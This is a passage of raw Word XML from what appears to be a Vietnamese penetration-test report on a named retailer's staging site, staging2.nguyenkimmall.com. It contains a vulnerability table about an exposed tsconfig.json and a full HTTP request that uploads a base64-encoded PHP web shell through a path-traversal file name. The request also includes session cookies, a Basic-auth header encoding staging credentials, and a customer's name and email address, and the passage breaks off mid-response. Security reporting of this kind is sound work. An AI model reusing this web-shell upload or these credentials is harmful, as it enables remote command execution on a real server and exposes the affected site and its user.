          </w:tcPr>
          <w:p w14:paraId="67E2AE27" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="13" w:name="OLE_LINK1"/>
            <w:bookmarkStart w:id="17" w:name="OLE_LINK2"/>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="4620D5F6" w14:textId="77777777" w:rsidTr="00013A35">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="78633BFA" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1200DCBC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007A3E4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[Critical.Vuln.Category_Vuln]:unprocessed]</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="50C0821E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74BD2B03" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1827FA78" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="0050547A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Hệ thống chứa tệp tsconfig.json ở thư mục root và không phân quyền truy cập, kẻ tấn công có thể thoải mái truy cập và có được thông tin kết nối cơ sở dữ liệu</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002214F4" w:rsidRPr="00013A35" w14:paraId="36C833CB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="044C9F68" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC0CB"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0A8BF87B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002216B2" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0056691F" w:rsidRPr="00013A35" w14:paraId="0659B1EB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3977B38F" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4030535C" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="003B048E" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18FAC52B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="0056691F" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="676AC6CE" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="00636316" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="6B72A364" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3A0B391F" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>RECOMMEND</w:t>
            </w:r>
            <w:r w:rsidR="0056691F" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>ATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5B9B2F4E" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00AE3A4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Dời vào thư mục khác hoặc thiết lập quyền truy cập cho tệp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="340D562E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="27F32E4A" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37438335" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00F635D8" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3FEE851A" w14:textId="77777777" w:rsidTr="001B336C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7EAFF8F3" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E121DD" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="0B22AAE2" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3C7515FB" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="72D9085C" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E41FA9" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>tsconfig.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="54F1EB5E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4C026483" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007B584C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">AFFECTED </w:t>
            </w:r>
            <w:r w:rsidR="00377F6A" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="12D6C937" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00CF70A7" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>https://staging2.nguyenkimmall.com:443/tsconfig.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3DC315E0" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5FDF4B50" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="145937EC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00957D8C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00780F62" w:rsidRPr="00013A35" w14:paraId="2E7D12D1" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="002B149C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0FC25D2C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Anonymous User</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F4795C1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4848D126" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pP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327"/>
      </w:tblGrid>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Request 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /upload.php HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621414327.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621414310.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznziznzgzizizdzizlzhziznziznzgzizizdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1; gr_rt=17982ec8c2d-a3443b6d74673b0d; _gat_UA-251534152-1=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Content-Length: 126</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>fileData=PGgxPktpZXROQSBkeiBmciBIUFQgQ3liZXIgc2VjPC9oMT4KPD89YCRfR0VUWzBdYCA/Pg==&amp;fileName=../../../../images/kiett.php.orionn""</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Response 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 200 OK</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:18:53 GMT</w:t>
              <w:br/>
              <w:t>Content-Type: text/html; charset=UTF-8</w:t>
              <w:br/>
              <w:t>Content-Length: 7</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>X-Powered-By: PHP/7.0.29</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=3600</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 10:18:53 GMT</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
